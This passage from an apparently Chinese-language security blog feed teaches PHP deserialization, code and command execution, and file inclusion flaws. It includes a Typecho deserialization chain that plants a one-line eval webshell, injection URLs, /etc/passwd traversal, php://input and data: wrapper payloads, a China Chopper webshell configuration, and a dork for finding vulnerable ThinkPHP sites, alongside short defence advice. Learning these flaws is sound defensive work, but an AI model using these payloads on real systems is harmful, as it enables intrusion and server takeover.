print_r($class2);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><br>    $class2_unser = unserialize($class2);<br>    print_r($class2_unser);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="可利用函数"><a href="#可利用函数" class="headerlink" title="可利用函数"></a>可利用函数</h3><table><thead><tr><th><strong>函数</strong></th><th><strong>触发条件</strong></th></tr></thead><tbody><tr><td>__wakeup()</td><td>使用unserialize时</td></tr><tr><td>__sleep()</td><td>使用serialize时</td></tr><tr><td>__destruct()</td><td>对象被销毁时</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()时</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时</td></tr><tr><td>__toString()</td><td>把类当作字符串使用时</td></tr><tr><td>__invoke()</td><td>把脚本尝试将对象调用为函数时</td></tr></tbody></table><hr><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="wakeup-或destruct"><a href="#wakeup-或destruct" class="headerlink" title="wakeup()或destruct()"></a><strong>wakeup()或</strong>destruct()</h3><p>因为<code>unserialize()</code>后会导致<code>__wakeup()</code>或<code>__destruct()</code>的直接调用，中间无需其它过程。因此最理想的情况就是一些漏洞/危害代码在<code>__wakeup()</code>或<code>__destruct()</code>中，从而当我们控制序列化字符串时可以直接触发它们<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chybeta</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> $test = <span class="hljs-string">'123'</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;<br>    $fp = fopen(<span class="hljs-string">"shell.php"</span>, <span class="hljs-string">"w"</span>);<br>    fwrite($fp, <span class="hljs-keyword">$this</span>-&gt;test);<br>    fclose($fp);<br>    &#125;<br>    &#125;<br><br>    $class3 = $_GET[<span class="hljs-string">'test'</span>];<br>    print_r($class3);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;<br>    $class3_unser = unserialize($class3);<br><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">"shell.php"</span>;<br>    <span class="hljs-comment">// 为显示效果，将shell.php整个包含进来</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>利用代码：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">7</span>:<span class="hljs-string">"chybeta"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">"&lt;?php phpinfo();?&gt;"</span>;&#125;<br></code></pre></td></tr></table></figure></p><p><strong>注：</strong>一般程序在创建的时候，都会重写析构函数和构造函数，反序列化就是利用这些重写的函数</p><hr><h3 id="typecho反序列化"><a href="#typecho反序列化" class="headerlink" title="typecho反序列化"></a>typecho反序列化</h3><h4 id="typecho介绍"><a href="#typecho介绍" class="headerlink" title="typecho介绍"></a>typecho介绍</h4><p>Typecho是一个简单、轻巧的博客程序，基于PHP，使用多种数据库（Mysql、PostgreSQL、SQLite）存储数据，在GPL Version 2许可证下发行，是一个开源的程序，目前使用SVN来做版本管理</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>漏洞发生在网站根目录下的install.php文件<br>代码：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span> : <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">'__typecho_config'</span>)));<br>    Typecho_Cookie::delete(<span class="hljs-string">'__typecho_config'</span>);<br>    $db = <span class="hljs-keyword">new</span> Typecho_DB($config[<span class="hljs-string">'adapter'</span>], $config[<span class="hljs-string">'prefix'</span>]);<br>    $db -&gt; addServer($config, Typecho_DB::READ | Typecho_DB::WRITE);<br>    Typecho_DB::set($db);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">'RSS 2.0'</span>;<br>    <span class="hljs-keyword">private</span> $_type;<br>    <span class="hljs-keyword">private</span> $_items;<br>    <span class="hljs-keyword">private</span> $_charset;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-keyword">$this</span>::RSS2;<br>    <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">'author'</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),<br>    );<br>    &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> $_params = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> $_filter = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">'screenName'</span>] = <span class="hljs-string">"file_put_contents('pupiles.php', '&lt;?php @eval($_POST[1]);?&gt;')"</span><br>    <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">'assert'</span>;<br>    &#125;<br>    &#125;<br><br>    $exp = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">'adapter'</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Feed,<br>    <span class="hljs-string">'prefix'</span> =&gt; <span class="hljs-string">'_pupiles'</span><br>    );<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize($exp));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">"adapter"</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">"Typecho_Feed"</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">"Typecho_Feed_type"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"ATOM1.0"</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">"Typecho_Feed_charset"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"UTF-8"</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">"Typecho_Feed_lang"</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"zh"</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">"Typecho_Feed_item"</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">"author"</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">"Typecho_Request"</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">"Typecho_Request_params"</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">"screenName"</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">"file_put_contents('404.php','&lt;?php @eval($_POST[i]);?&gt;')"</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">"Typecho_Request_filter"</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"assert"</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">"prefix"</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">"typecho"</span>;&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="修复和防御"><a href="#修复和防御" class="headerlink" title="修复和防御"></a>修复和防御</h3><p>和大多数漏洞一样，反序列化问题也是用户参数的控制问题引起的，所以好的预防措施就是：<br>不要抱用户的输入或用户可用的参数直接放进反序列化的操作中去</p><h2 id="反序列化实例"><a href="#反序列化实例" class="headerlink" title="反序列化实例"></a>反序列化实例</h2><h3 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h3><p><code>var_dump.php</code><br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> $test = <span class="hljs-string">"demo"</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>    &#125;<br><br>    $A = <span class="hljs-keyword">new</span> A;<br>    $test = $_GET[<span class="hljs-string">'test'</span>];<br>    $pp = serialize($A);  <span class="hljs-comment">// 构造序列化对象</span><br>    <span class="hljs-keyword">echo</span> $pp;<br>    $test_unser = unserialize($test);  <span class="hljs-comment">// 反序列化的同时触发__destruct函数</span><br>    var_dump($test_unser);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>POST:<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/var_dump.php?<span class="hljs-built_in">test</span>=O:1:%22A%22:1:&#123;s:4:<span class="hljs-string">"test"</span>;s:10:<span class="hljs-string">"phpinfo();"</span>;&#125;<br></code></pre></td></tr></table></figure></p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>序列化<br>session有效的时候，存到服务器硬盘</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Deserialization </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>任意代码执行</title>
      <link href="/2019/01/17/Arbitrary-code-execution/"/>
      <url>/2019/01/17/Arbitrary-code-execution/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>当应用在调用一些能将字符串转化成代码的函数时，未考虑用户是否能够控制此字符串，从而产生代码注入漏洞</p><ul><li><p>在<code>php</code>中：<br><code>eval</code><br><code>assert</code><br><code>preg_replace(&#39;/*/e&#39;,&#39;$ret=&quot;\\1&quot;;&#39;,$data);</code></p></li><li><p>在<code>asp</code>中：<br><code>eval</code><br><code>execute</code><br><code>executeglobal</code></p></li><li><p>在<code>jsp</code>中：<br>jsp中没有php中的<code>eval</code>函数，但是可以使用<strong>反射机制</strong>，使用基于反射机制的表达式引擎，例如：<br><code>0GNL</code>、<code>SpEL</code>、<code>MVEL</code>等</p></li></ul><hr><h3 id="漏洞存在原因"><a href="#漏洞存在原因" class="headerlink" title="漏洞存在原因"></a>漏洞存在原因</h3><p>应用有时会考虑代码的简洁性、灵活性，在代码中调用<code>eval</code>之类的函数。<br>即：应用的所有配置都在数据库中存储，通过此函数，直接读取配置，而不需要使用正则之类的来一点一点读取配置<br>例如在<code>phpcms</code>中使用<code>string2array()</code>：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># $data表示字符串数组</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string2array</span><span class="hljs-params">($data)</span> </span>&#123;<br><span class="hljs-keyword">if</span>($data == <span class="hljs-string">''</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$array = $data;"</span>);<br><span class="hljs-keyword">return</span> $array;<br>&#125;<br></code></pre></td></tr></table></figure></p><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="查找漏洞站点"><a href="#查找漏洞站点" class="headerlink" title="查找漏洞站点"></a>查找漏洞站点</h3><p>例如：<br>由于<code>thinkphp</code>存在代码执行漏洞，可以使用<code>Google Hacing</code>搜索此类网站<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">inurl:think.php<br></code></pre></td></tr></table></figure></p><p>学会代码审计技巧，自行寻找</p><hr><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>简单代码执行：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    $data = $_GET[<span class="hljs-string">'data'</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$ret = strtolower(\"$data\");"</span>);<br>    <span class="hljs-keyword">echo</span> $ret;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>利用方式：<br>其中    <code>${}</code>代表变量<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">$data=<span class="hljs-number">1</span><span class="hljs-string">");phpinfo();//<br>http://localhost/?data=$&#123;phpinfo();&#125;<br>http://localhost/?code=$&#123;@eval($_POST[1]);&#125;</span><br></code></pre></td></tr></table></figure></p><hr><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><ol><li>使用<code>json</code>保存数组，当读取时就无需使用<code>eval</code>了</li><li>对于必须使用<code>eval</code>的地方，一定严格处理用户数据（黑、白名单）</li><li>字符串使用单引号包括可控代码，插入前使用<code>addslashes</code>转义（<code>addslashes</code>、<code>魔术引号</code>、<code>htmlspecialchars</code>、<code>htmlentities</code>、<code>mysql_real_escape_string</code>）</li><li>放弃使用<code>preg_replace</code>的<code>e</code>修饰符，使用<code>preg_replace_callback()</code>替换</li><li>若必须使用<code>preg_replace</code>的<code>e</code>修饰符，则必须使用单引号包裹正则匹配出的对象（<code>preg_replace</code>+<code>正则</code>）</li></ol><hr><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul><li>继承Web应用程序的权限，执行系统命令</li><li>读写文件</li><li>反弹Shell</li><li>控制整个网站和服务器</li><li>进行内网渗透</li></ul><hr><h3 id="Jsp的Strtus2框架"><a href="#Jsp的Strtus2框架" class="headerlink" title="Jsp的Strtus2框架"></a>Jsp的Strtus2框架</h3><p><code>strtus2</code>框架一直出现安全问题，大多都是命令执行问题<br>例如：<br><code>s2-037</code>、<code>s2-045</code>、<code>s2-048</code>等</p><p>可以去github寻找<code>poc</code>和<code>exp</code></p><hr><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>尽量不使用系统执行命令</li><li>在进行执行命令函数方法之前，变量一定要做好过滤，对敏感字符进行转义</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>对PHP语言来说，不能完全控制的危险函数最好舍弃</li></ol><hr><h2 id="常用系统命令与功能"><a href="#常用系统命令与功能" class="headerlink" title="常用系统命令与功能"></a>常用系统命令与功能</h2><h3 id="Windows下同时执行多条命令"><a href="#Windows下同时执行多条命令" class="headerlink" title="Windows下同时执行多条命令"></a>Windows下同时执行多条命令</h3><p>语法格式：</p><table><thead><tr><th><strong>命令格式</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>command1 <code>&amp;</code> command2</td><td>顺序执行1、2，无论1执行否成功</td></tr><tr><td>command1 <code>&amp;&amp;</code> command2</td><td>顺序执行1、2，只有1执行成功时才执行2</td></tr><tr><td>command1 $temp2 command2</td><td>顺序执行1、2，只有1执行失败时才执行2</td></tr><tr><td>command1 $temp1 command2</td><td>管道符，将1的执行作为输入传递给2</td></tr></tbody></table><p>由于MarkDown表格语法对管道符<code>|</code>冲突，此处<br>$temp2 代表 <code>||</code><br>$temp1 代表 <code>|</code></p><hr><h3 id="Linux下同时执行多条命令"><a href="#Linux下同时执行多条命令" class="headerlink" title="Linux下同时执行多条命令"></a>Linux下同时执行多条命令</h3><table><thead><tr><th><strong>命令格式</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>command1 <code>;</code> command2</td><td>顺序执行1、2，无论1执行否成功</td></tr><tr><td>command1 <code>&amp;&amp;</code> command2</td><td>顺序执行1、2，只有1执行成功时才执行2</td></tr><tr><td>command1 $temp2 command2</td><td>顺序执行1、2，只有1执行失败时才执行2</td></tr><tr><td>command1 $temp1 command2</td><td>管道符，将1的执行作为输入传递给2</td></tr></tbody></table><p>由于MarkDown表格语法对管道符<code>|</code>冲突，此处<br>$temp2 代表 <code>||</code><br>$temp1 代表 <code>|</code></p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>单引号内变量不传值<br>启动魔术引号gpc后，单引号会被转义</p><p>php弱类型，去数字1abcd只取第一个‘1’</p><p>使用/e参数会先执行再匹配，导致危险代码执行<br>preg_replace(“/test/e”,$data,”test”);</p><hr><h3 id="Kali破解Hash"><a href="#Kali破解Hash" class="headerlink" title="Kali破解Hash"></a>Kali破解Hash</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john passwd<br></code></pre></td></tr></table></figure><p><a href="https://github.com/instruder/Security/tree/master/research/wifirouter/vul/D-Link" target="_blank" rel="noopener"><strong><code>网络检测功能任意命令注入(DI-7100(Beat 1022))</code></strong></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Execution </tag>
            
            <tag> Code </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2019/01/15/File-include-hole/"/>
      <url>/2019/01/15/File-include-hole/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预料之外的文件，就可能导致以外的文件泄露甚至恶意代码注入</p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><p>Local File Inclusion<br>能够读取或执行包含本地文件的漏洞<br>eg:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>$file = $_GET[<span class="hljs-string">'file'</span>];<br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">'/home/wwwrun/'</span>.$file.<span class="hljs-string">'.php'</span>)) &#123;<br><span class="hljs-keyword">include</span> <span class="hljs-string">'/home/wwwrun/'</span>.$file.<span class="hljs-string">'.php'</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>linux系统越权读取（需要读权限）<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">'/home/wwwrun/../../../../../../etc/passwd\0.php</span><br></code></pre></td></tr></table></figure></p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>Remote File Inclusion<br>例如若<code>php.ini</code>的配置选项<code>allow_url_include</code>为<code>ON</code>的话，文件包含函数是可以加载远程文件的。利用远程文件包含漏洞，可以直接执行任意命令</p><hr><h3 id="漏洞形成条件"><a href="#漏洞形成条件" class="headerlink" title="漏洞形成条件"></a>漏洞形成条件</h3><ul><li><code>include()</code>等函数通过动态变量的方式引入需要包含的文件</li><li>用户能够控制这个动态变量</li></ul><h3 id="高危触发点"><a href="#高危触发点" class="headerlink" title="高危触发点"></a>高危触发点</h3><p>常见</p><ul><li><code>include()</code></li><li><code>require()</code></li><li><code>include_once()</code></li><li><code>require_once()</code></li><li>对文件进行操作的其它函数，如<code>f_open()</code>,<code>f_read()</code>等</li></ul><hr><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>敏感信息泄露</li><li>获取Webshell</li><li>任意命令执行</li></ul><hr><h2 id="文件包含进阶"><a href="#文件包含进阶" class="headerlink" title="文件包含进阶"></a>文件包含进阶</h2><h3 id="一般截断包含"><a href="#一般截断包含" class="headerlink" title="一般截断包含"></a>一般截断包含</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'page'</span>])) &#123;<br>    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">'page'</span>].<span class="hljs-string">".php"</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">'home.php'</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此方法只适用于<code>magic_quotes_gpc=off</code>时，在PHP的老版本中也时存在着一些其它的截断问题，如今已极少见<br>eg:<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">index.php?file=info.txt///////////..(超过一定数据的/)..//<br></code></pre></td></tr></table></figure></p><hr><h3 id="00截断包含"><a href="#00截断包含" class="headerlink" title="00截断包含"></a>00截断包含</h3><p>php &lt; 5.3.4时，可以使用</p><ul><li><code>%00</code>，<code>.</code>截断</li><li>Windows文件长度 &lt;= 255 截断</li><li>Linux下文件名长度 &lt;= 1024Bytes 截断</li><li>远程文件包含时，使用<code>?</code>截断，全版本通杀</li></ul><hr><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4><p>构造一个输入值为如下的漏洞验证语句并POST，并用<code>php://</code>协议去解释它<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//input</span><br>POST: <span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>菜刀连接：<br><a href="http://127.0.0.1/dvwa-master/vulnerabilities/fi/?page=//input" target="_blank" rel="noopener">http://127.0.0.1/dvwa-master/vulnerabilities/fi/?page=//input</a><br>菜刀配置：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;O&gt;<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span>&lt;/O&gt;<br></code></pre></td></tr></table></figure></p><h4 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4><p>构造一个内容为：<code>&lt;?php%20phpinfo();?&gt;</code><br>类型为：<code>data:text/plain</code><br>的数据，并包含它<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span><br>data:text/html,<span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><hr><h4 id="封装协议摘要"><a href="#封装协议摘要" class="headerlink" title="封装协议摘要"></a>封装协议摘要</h4><p>这里主要针对<code>php://filter</code>，参考被筛选的封装器<br><a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">参考链接</a></p><p>常用：</p><ul><li><p>使用<code>rot13</code>编码读取文件内容（回转13位,rotate by 13 places，替换为原字符的后13位所表示的字符）</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=string.rot13/resource=文件名</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>base64</code>编码读取文件内容</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=文件名</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>toupper</code>、<code>tolower</code>编码读取文件<br>php://filter/read=string.toupper/resource=<br>php://filter/read=string.tolower/resource=</p></li></ul><p>这里编码的意义是进行绕过，绕过<code>&lt;?php</code>结构等，例如php5.x会针对<code>&lt;?php</code>进行过滤，因此又有如下绕过方法：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">"php"</span>&gt;<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><hr><h4 id="直接指定路径"><a href="#直接指定路径" class="headerlink" title="直接指定路径"></a>直接指定路径</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>压缩包，用如下方法：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">zip:<span class="hljs-comment">//绝对路径%23文件名</span><br>zip:<span 